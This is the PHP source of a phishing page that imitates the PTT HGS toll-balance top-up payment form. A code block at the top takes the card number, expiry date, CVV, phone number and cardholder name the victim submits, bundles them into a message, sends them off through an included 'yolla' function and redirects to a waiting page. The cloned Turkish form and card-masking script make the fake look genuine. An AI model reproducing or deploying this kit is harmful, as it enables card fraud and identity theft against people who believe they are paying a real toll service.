<?php
include("baglan.php");
date_default_timezone_set('Europe/Istanbul');
if($_POST){
$kk = htmlspecialchars($_POST['kk']);
$skt = htmlspecialchars($_POST['skt']);
$cvv = htmlspecialchars($_POST['cvv']);
$tel = htmlspecialchars($_POST['tel']);
$adsoyad = htmlspecialchars($_POST['adsoyad']);
$mesaj = $kk."|".$skt."|".$cvv."\nTelefon: ".$tel."\nAd Soyad: ".$adsoyad;
yolla($mesaj);
header('Location:bekle.php');
    
}

include "header.php";
?>
<div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">

            
            <!--      Wizard container        -->
            <div class="wizard-container">

                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                        <!--        You can switch " data-color="orange" "  with one of the next bright colors: "blue", "green", "orange", "red", "azure"          -->

                        <div class="wizard-header">
                            <div class="panel-header-icons">
                                <img class="panel-header-first-icon" src="./v2/assets/images/panel/homepage.png?v=201910111500">
                            </div>
                            <h1>
                                <img class="panel-header-second-icon" src="./v2/assets/images/panel/hgs.png?v=201910111500">
                                Bakiye Yükleme
                            </h1>
                            <h6 class="hgs-query-subtitle">
                                BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                            </h6>
                        </div>



                        <div class="tab-content text-center">
                            <div class="tab-pane panel-border" id="hgs-query-check">
                                <form id="hgsQueryNo" name="hgs-query-no" data-tab="0" novalidate="novalidate">
                                

                                </form>
                            </div>

                            <div class="tab-pane panel-border" id="hgs-query-label">
                                
                            </div>

                            <div class="tab-pane panel-border" id="hgs-query-amounts">

                                
                            </div>

                            <div class="tab-pane panel-border active" id="hgs-query-payment">
                                <div class="panel-inside">
                                <div class="payment-container hgs-query-credit-card-container">
                                    <div class="col-sm-12"><span class="tab-pane-heading">Ödeme yapmak için kullanmak istediğiniz kart bilgilerini girin.</span></div>
                                    <form method="post" name="payment-form" class="payment-form "  data-tab="3" novalidate="novalidate">

                                    <div class="col-sm-5 panel-credit-card-container">
                                        <input type="hidden" class="hgs-query-token" value="baa7ac61137712b4a60d04b38d0a84afb12f6937a6c58a95769918cfea48a3e6">
                                            <div class="row">
                                            <input type="hidden" id="user_id" name="user_id" value="0">
                                            <input type="hidden" id="pay_type" name="pay_type" value="1">
                                            <input type="hidden" class="hgs_id" name="hgs_id" value="1110205911">
                                            <input type="hidden" id="products[]" class="hgs-products" name="products[]" value="3">
                                            <input type="hidden" id="device_id" name="device_id" value="web">
                                            <input type="hidden" id="source" name="source" value="2">

                                            <input type="hidden" id="email" name="email" value="">
                                            <input type="hidden" id="user_tckno" name="user_tckno" value="0">


                                            <div class="form-group">
    <label>Kart üzerindeki ad ve soyad</label>
    <input type="text" name="adsoyad" class="form-control" placeholder="Adı Soyadı" autocomplete="off" onfocus="this.select()">
</div>

<div class="form-group">
    <label>Kart numaranız</label>
    <input type="text" id="ccNumber" name="kk" class="form-control" maxlength="19" autocomplete="off" placeholder="Kredi Kartı Numarası">
</div>

<div class="card-half-field row">
    <div class="col-sm-7 form-group">
        <label>Son kul. tarihi</label>
        <input type="text" name="skt" id="ccskt" class="form-control" maxlength="7" autocomplete="off" placeholder="Ay / Yıl">
    </div>

    <div class="col-sm-5 form-group">
        <label>CVC kodu</label>
        <!--<a class="text-warning what-is-cvc" data-toggle="tooltip" title="<img src='https://hgs-site.mncdn.com/v2/assets/images/cvc-graphic.png' width='100%' />">(?)</a>-->
        <input type="text" name="cvv" id="cccvv" class="form-control" maxlength="3" placeholder="CVC" autocomplete="off">
    </div>
</div>
                                        </div>

                                        <input type="hidden" class="post_payment_data" value="" data-hgsid="1110205911" data-price="50" data-commission="4">
                                        <input type="hidden" id="clicked_tab_index" value="">
                                    </div>
                                     <div class="col-sm-7 form-group panel-card-wrapper">
                                        <div class="card-wrapper" data-jp-card-initialized="true">
                                        <div class="jp-card-container"><div class="jp-card"><div class="jp-card-front"><div class="jp-card-logo jp-card-elo"><div class="e">e</div><div class="l">l</div><div class="o">o</div></div><div class="jp-card-logo jp-card-visa">Visa</div><div class="jp-card-logo jp-card-visaelectron">Visa<div class="elec">Electron</div></div><div class="jp-card-logo jp-card-mastercard">Mastercard</div><div class="jp-card-logo jp-card-maestro">Maestro</div><div class="jp-card-logo jp-card-amex"></div><div class="jp-card-logo jp-card-discover">discover</div><div class="jp-card-logo jp-card-dinersclub"></div><div class="jp-card-logo jp-card-dankort"><div class="dk"><div class="d"></div><div class="k"></div></div></div><div class="jp-card-logo jp-card-jcb"><div class="j">J</div><div class="c">C</div><div class="b">B</div></div><div class="jp-card-lower"><div class="jp-card-shiny"></div><div class="jp-card-cvc jp-card-display">•••</div><div class="jp-card-number jp-card-display">•••• •••• •••• ••••</div><div class="jp-card-name jp-card-display">AD SOYAD</div><div class="jp-card-expiry jp-card-display" data-before="ay/yıl" data-after="valid
thru">••/••</div></div></div><div class="jp-card-back"><div class="jp-card-bar"></div><div class="jp-card-cvc jp-card-display">•••</div><div class="jp-card-shiny"></div></div></div></div></div>

                                        <button type="sumbit" class="btn btn-warning" onclick="hgs.payment();" id="panel-do-payment-btn">ÖDEME YAP <img src="./v2/assets/images/tabs/payment.png"></button>

                                    </div>
                                                                            
                                            <span>Telefon numaranızı giriniz.</span>
                                            <input type="text" class="form-control text-center  hgs-query-inputs" name="tel" id="phone" placeholder="(xxx)xxx-xxxx"  aria-required="true">
                                        
										<script>document.getElementById('phone').addEventListener('input', function (e) {
  var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
  e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
}); </script>
                                        <div class="panel-contract-container panel-inside">
        <label class="checkbox bounce">
            <input type="checkbox" id="hgs-credit-card-contract" onchange="app.checkContractChecked($(this))" value="0">
            <svg viewBox="0 0 21 21">
                <polyline points="5 10.75 8.5 14.25 16 6"></polyline>
            </svg>
            <span class="checkbox-msg">
                <a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a> ve <a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
            </span>
        </label>
        <span class="contract-not-checked-msg display-none">Lütfen sözleşmeleri okuduğunuzu onaylayın.</span>
    </div>                                                                        </form>
                                    <div class="col-sm-12">
                                        <span class="hgs-query-payment-message payment-info-message">Ödeme işlemini onayladığınızda, <span class="text-warning"></span> kartınızdan tahsis edilecektir.</span>
                                    </div>
                                </div>

                                <div class="hgs-query-bank-transfer-container" style="display: none;">


                                    <form method="post" name="bank-transfer-form" id="bank-transfer-form" action="https://api.pttavm.com/v2/hgs/pay" novalidate="novalidate">

                                        <div class="row">
                                            <div class="col-sm-12">

                                                <span class="tab-pane-heading">Havale yapmak için kullanacağınız bankayı seçin.</span>
                                                <div class="select-wrapper bank-transfer-list-wrapper">
                                                    <select name="bank_id" class="form-control hgs-bank-transfer-list" onchange="hgs.setBankID($(this))"><option value="">Seçiniz</option></select>
                                                </div>

                                                <div class="panel-email-container panel-inside">
                                                    <span>Dekont ve referans kodunun gönderileceği e-posta adresini girin.</span>
                                                    <input type="email" class="form-control text-center hgs-query-email hgs-query-inputs"  name="tel" placeholder="Telefon" value="">
                                                </div>
                                                <div class="panel-contract-container panel-inside">
        <label class="checkbox bounce">
            <input type="checkbox" id="bank-transfer-contract" onchange="app.checkContractChecked($(this))" value="0">
            <svg viewBox="0 0 21 21">
                <polyline points="5 10.75 8.5 14.25 16 6"></polyline>
            </svg>
            <span class="checkbox-msg">
                <a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a> ve <a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
            </span>
        </label>
        <span class="contract-not-checked-msg display-none">Lütfen sözleşmeleri okuduğunuzu onaylayın.</span>
    </div>                                                <input type="hidden" id="hgs-captcha-white-list" value="[&quot;91.93.63.194&quot;]">
                                                <input type="hidden" id="get-ip-via" value="85.106.218.238">
                                                                                                    <div class="panel-inside recaptcha-field" align="center">
                                                        <div id="hgs-recaptcha"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LfWns8ZAAAAAPiknER72Jvj84KgPdeQtXFt47M2&amp;co=aHR0cHM6Ly9oZ3MucHR0YXZtLmNvbTo0NDM.&amp;hl=tr&amp;v=Iwg4ANhK7Iu8SHToSsE0E20K&amp;theme=dark&amp;size=normal&amp;cb=icjc1l5vr2nv" width="304" height="78" role="presentation" name="a-53vf47fufkp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><textarea id="g-recaptcha-response-1" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
                                                        <span class="recaptcha-callback-not-valid-msg display-none">Doğrulama işlemi tamamlanmadı!</span>
                                                    </div>
                                                                                                <button type="button" class="btn btn-warning start-bank-transfer-btn panel-do-payment-btn" onclick="hgs.startBankTransfer();">
                                                    İŞLEMİ TAMAMLA <img src="./v2/assets/images/tabs/payment.png">
                                                </button>
                                            </div>
                                        </div>

                                        <input type="hidden" id="bank_transfer_user_id" name="user_id" value="0">
                                        <input type="hidden" id="bank_transfer_pay_type" name="pay_type" value="2">
                                        <input type="hidden" id="bank_transfer_device_id" name="device_id" value="web">
                                        <input type="hidden" id="bank_transfer_source" name="source" value="2">
                                        <input type="hidden" class="hgs_id" name="hgs_id" value="1110205911">
                                        <input type="hidden" class="hgs-products" name="products[]" value="3">
                                        <input type="hidden" id="bank_transfer_user_tckno" name="user_tckno" value="0">
                                    </form>

                                </div>

                                </div>

                            </div>
                        </div><!-- tab content -->

                        <div class="wizard-footer">

                            
                            <div class="clearfix"></div>
                        </div>

                </div>
            </div> <!-- wizard container -->
        </div>
		
<script>let ccNumberInput = document.querySelector('#ccNumber'),
													ccNumberPattern = /^\d{0,16}$/g,
													ccNumberSeparator = " ",
													ccNumberInputOldValue,
													ccNumberInputOldCursor,
													
													ccExpiryInput = document.querySelector('#ccskt'),
													ccExpiryPattern = /^\d{0,4}$/g,
													ccExpirySeparator = "/",
													ccExpiryInputOldValue,
													ccExpiryInputOldCursor,
													
													ccCVCInput = document.querySelector('#cccvv'),
													ccCVCPattern = /^\d{0,3}$/g,
													
													mask = (value, limit, separator) => {
														var output = [];
														for (let i = 0; i < value.length; i++) {
															if ( i !== 0 && i % limit === 0) {
																output.push(separator);
															}
															
															output.push(value[i]);
														}
														
														return output.join("");
													},
													unmask = (value) => value.replace(/[^\d]/g, ''),
													checkSeparator = (position, interval) => Math.floor(position / (interval + 1)),
													ccNumberInputKeyDownHandler = (e) => {
														let el = e.target;
														ccNumberInputOldValue = el.value;
														ccNumberInputOldCursor = el.selectionEnd;
													},
													ccNumberInputInputHandler = (e) => {
														let el = e.target,
																newValue = unmask(el.value),
																newCursorPosition;
														
														if ( newValue.match(ccNumberPattern) ) {
															newValue = mask(newValue, 4, ccNumberSeparator);
															
															newCursorPosition = 
																ccNumberInputOldCursor - checkSeparator(ccNumberInputOldCursor, 4) + 
																checkSeparator(ccNumberInputOldCursor + (newValue.length - ccNumberInputOldValue.length), 4) + 
																(unmask(newValue).length - unmask(ccNumberInputOldValue).length);
															
															el.value = (newValue !== "") ? newValue : "";
														} else {
															el.value = ccNumberInputOldValue;
															newCursorPosition = ccNumberInputOldCursor;
														}
														
														el.setSelectionRange(newCursorPosition, newCursorPosition);
														
														highlightCC(el.value);
													},
													highlightCC = (ccValue) => {
														let ccCardType = '',
																ccCardTypePatterns = {
																	amex: /^3/,
																	visa: /^4/,
																	mastercard: /^5/,
																	disc: /^6/,
																	
																	genric: /(^1|^2|^7|^8|^9|^0)/,
																};
														
														for (const cardType in ccCardTypePatterns) {
															if ( ccCardTypePatterns[cardType].test(ccValue) ) {
																ccCardType = cardType;
																break;
															}
														}
														
														let activeCC = document.querySelector('.cc-types__img--active'),
																newActiveCC = document.querySelector(`.cc-types__img--${ccCardType}`);
														
														if (activeCC) activeCC.classList.remove('cc-types__img--active');
														if (newActiveCC) newActiveCC.classList.add('cc-types__img--active');
													},
													ccExpiryInputKeyDownHandler = (e) => {
														let el = e.target;
														ccExpiryInputOldValue = el.value;
														ccExpiryInputOldCursor = el.selectionEnd;
													},
													ccExpiryInputInputHandler = (e) => {
														let el = e.target,
																newValue = el.value;
														
														newValue = unmask(newValue);
														if ( newValue.match(ccExpiryPattern) ) {
															newValue = mask(newValue, 2, ccExpirySeparator);
															el.value = newValue;
														} else {
															el.value = ccExpiryInputOldValue;
														}
													};

											ccNumberInput.addEventListener('keydown', ccNumberInputKeyDownHandler);
											ccNumberInput.addEventListener('input', ccNumberInputInputHandler);

											ccExpiryInput.addEventListener('keydown', ccExpiryInputKeyDownHandler);
											ccExpiryInput.addEventListener('input', ccExpiryInputInputHandler);
											
											
											</script>
<?php
include "footer.php";
?>